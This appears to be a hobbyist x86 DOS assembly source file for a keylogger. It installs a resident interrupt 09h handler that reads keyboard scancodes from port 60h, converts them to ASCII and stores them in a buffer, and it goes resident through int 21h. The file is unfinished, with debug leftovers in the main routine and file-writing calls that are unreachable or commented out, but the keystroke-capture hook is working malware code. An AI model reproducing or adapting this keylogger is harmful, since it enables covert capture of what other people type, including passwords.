; This is int 09h override for keyloger to get chars into buffer

;testing purposes


KBD equ 060h

_maina:
   call _get_command_line
   mov cx, 10
   mov ax, cs
   mov es, ax
   mov di, si
   call _debugMemory
   mov si, baba 
   call _str_equals
   jne .incorrect
   mov al, 'T'
   call _printc
   jmp .end   
.incorrect:
   mov al, 'N'
   call _printc
.end:
   ret 
;   call install_dos_handler
;   call _open_file
;   call _write_to_file
;   ret
  call install_flush_timer
  call install_keyboard_handler  

  mov dx, 00fffh
  mov ah, 31h
  mov al, 0h
  int 21h
 ret

  ;get file name from psp
  mov al, 'a'
  call _printc

  call _open_file
   mov al, 'a'
  call _printc

  ;call install_flush_timer
  mov al, 'a'
  call _printc
 
  call install_keyboard_handler
  call _write_to_file  
  ret
  mov dx, 00fffh
  mov ah, 31h
  mov al, 0h
  int 21h
 ret
install_keyboard_handler:
  pusha
  push ds
  push es
  ;blocking usage of interrupts
  cli
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  ;saving old value of offset
  mov ax, [es:09h*4]
  mov [old_09h_offset], ax
  ;saving old value of segment
  mov ax, [es:09h*4+2]
  mov [old_09h_segment], ax
  ;installing this interrupt
  ;offset
  mov ax, keyboard_handler
  mov [es:09h*4],ax
  ;segment is same as this code segment - com only
  mov [es:09h*4+2], cs
  mov cx, 200
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret

uninstall_keyboard_handler:
  pusha
  push ds
  push es
  mov ax, cs
  mov ds, ax
  ;blocking usage of interrupts
  cli
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  call set_ds_to_tsr 
  ;recovering this interrupt
  ;offset
  mov ax, [old_09h_offset]
  mov [es:09h*4],ax
  ;segment
  mov ax, [old_09h_segment]
  mov [es:09h*4+2], ax
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret
   
keyboard_handler:
  pusha
  push ds
  push es
  ;setting ds to be able to use labels
  mov ax, cs
  mov ds, ax    
  
  ;get pressed letter or number to al
  in al, KBD
  

  ;converting to ascii
  mov bx, xlat_lowercase_table
  ;if it is not press scancode then ignore it
  mov ah, al
  and ah, 080h
  jnz .i_dont_want_it
  
  xlat
  or al, al
  jz .i_dont_want_it
  ;sync
  ;call _printc
  cli  
  ;working on it
  ;taking info about buffer
  mov bx, buffer
  mov di, [buffer_size]
  ;putting key pressed ascii at end of the buffer
  mov [bx + di], al
  ;incrementing current buffer size
  inc di
  ;updating buffer size in memory
  mov [buffer_size], di
  sti
 .i_dont_want_it: 
  ;chaining interrupts
  ;sending flags because I have iret waiting in old interrupt
  cli
  pushf
  call far word [old_09h]
  sti


  mov cx, [buffer_size]
  mov ax, ds
  mov es, ax
  mov di, buffer
  pop es
  pop ds
  popa
  iret

segment .data

baba: db 'babaraba'
old_09h:
old_09h_offset:  dw 0
old_09h_segment: dw 0
buffer_size: dw 0
buffer: times 255 db 0



